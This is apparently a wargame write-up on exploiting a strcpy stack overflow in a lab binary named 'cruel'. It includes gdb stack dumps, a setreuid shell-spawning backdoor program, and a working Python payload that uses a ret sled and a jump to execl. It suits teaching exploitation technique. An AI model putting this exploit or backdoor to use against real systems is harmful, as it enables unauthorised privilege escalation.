# Vulnerability
```c
char buffer[256];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary.

# Exploitation
I found not changing value on stack, so I will use ret sled to get there and call execl function.

In stack, 0x008caff4 does not changed and the next 4 bytes(0x007a2ca0)'s value is '0x00':
```
(gdb) x/32x $esp
0xbfd859ec:	0x007bad00	0x00000002	0xbfd85a74	0xbfd85a80
0xbfd859fc:	0xbfd85a30	0x00795898	0x007a3878	0xb7f88690
0xbfd85a0c:	0x00000001	0x008caff4	0x007a2ca0	0x08048454

(gdb) x/x 0x008caff4
0x8caff4:	0x008cad3c
(gdb) x/x 0x007a2ca0
0x7a2ca0 <_rtld_local_ro>:	0x00000000
```

Make a simple backdoor program named as `0x008caff4`'s value(0x008cad3c):
```c
[dark_stone@Fedora_2ndFloor ~]$ cat ./backdoor.c 
#include <stdio.h>
int main(void) {
	setreuid(geteuid(), geteuid());
	system("/bin/sh");
}
[dark_stone@Fedora_2ndFloor ~]$ gcc -o ./`python -c 'print "\x3c\xad\x8c"'` ./backdoor.c
```

The payload will be:
```
--------------------------------------------
| A * 260 | RET SLED * 7 | execl's address |
--------------------------------------------
```
# Payload
```python
import os
from struct import *

target = "/home/dark_stone/cruel"

payload = ""
payload += "A"*260
payload += "\x51\x84\x04\x08" * 7 # ret sled
payload += "\x68\x2d\x83" # execl's address

os.execv(target, [target, payload])
```
